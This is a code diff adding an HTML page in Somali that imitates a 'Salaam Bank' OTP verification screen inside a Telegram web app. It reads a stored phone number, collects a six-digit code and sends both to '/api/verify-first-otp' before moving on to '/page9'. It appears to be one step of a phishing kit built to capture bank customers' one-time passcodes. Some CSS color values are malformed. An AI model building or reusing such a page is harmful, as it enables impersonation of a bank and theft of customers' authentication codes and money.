@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Salaam Bank - Xaqiijinta OTP</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bank-primary: #008751;
+            --bank-gradient: linear-gradient(180deg, #00aa63 0%, #008751 100%);
+            --bg-color: #f7f7f7;
+            --card-bg: #ffffff;
+        }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; align-items: center; }
+        .header-box { width: 100%; background: var(--bank-gradient); padding: 25px 20px 40px 20px; color: white; text-align: center; font-size: 26px; font-weight: 800; }
+        .main-container { width: 100%; display: flex; justify-content: center; margin-top: -20px; flex-grow: 1; }
+        .card { background: var(--card-bg); width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08); }
+        h2 { margin: 0 0 12px 0; font-size: 22px; color: #11; font-weight: 800; text-align: center; }
+        .instruction { font-size: 14px; color: #66; margin: 0 0 12px 0; text-align: center; }
+        .phone-number { font-size: 16px; font-weight: 800; color: #11; margin-bottom: 25px; text-align: center; }
+        .code-input-container { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 20px; }
+        .code-box { width: 48px; height: 54px; border: 2px solid var(--bank-primary); border-radius: 10px; text-align: center; font-size: 22px; font-weight: 800; outline: none; }
+        .submit-btn { width: 100%; background-color: #e0e0e0; color: #999; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
+        .submit-btn.active { background-color: var(--bank-primary); color: white; cursor: pointer; }
+        .footer-banner { width: 100%; background: var(--bank-gradient); height: 80px; border-top-left-radius: 50% 30px; border-top-right-radius: 50% 30px; margin-top: 40px; }
+    </style>
+</head>
+<body>
+<div class="header-box">Salaam Bank</div>
+
+<div class="main-container">
+    <div class="card">
+        <h2>Xaqiijinta OTP</h2>
+        <p class="instruction">Gali koodhka 6-lambar ah ee laguu soo diray SMS-ka</p>
+        <div class="phone-number" id="displayPhone">+252 ...</div>
+
+        <div class="code-input-container">
+            <input type="text" maxlength="1" class="code-box">
+            <input type="text" maxlength="1" class="code-box">
+            <input type="text" maxlength="1" class="code-box">
+            <input type="text" maxlength="1" class="code-box">
+            <input type="text" maxlength="1" class="code-box">
+            <input type="text" maxlength="1" class="code-box">
+        </div>
+
+        <button id="submitBtn" class="submit-btn" disabled>XAQIIJI</button>
+    </div>
+</div>
+
+<div class="footer-banner"></div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const displayPhone = document.getElementById('displayPhone');
+    const codeBoxes = document.querySelectorAll('.code-box');
+    const submitBtn = document.getElementById('submitBtn');
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
+    
+    if (savedPhone) displayPhone.textContent = `+252 ${savedPhone}`;
+
+    codeBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+            if (box.value && index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
+            const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
+            submitBtn.disabled = fullCode.length !== 6;
+            submitBtn.classList.toggle('active', fullCode.length === 6);
+        });
+    });
+
+    submitBtn.addEventListener('click', async () => {
+        if (submitBtn.disabled) return;
+        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
+        
+        try {
+            const res = await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: savedPhone, code: codeValue })
+            });
+            const data = await res.json();
+            if (data.success) {
+                window.location.href = "/page9";
+            }
+        } catch (err) { alert("Cillad xagga shabakadda ah."); }
+    });
+});
+</script>
+</body>
+</html>
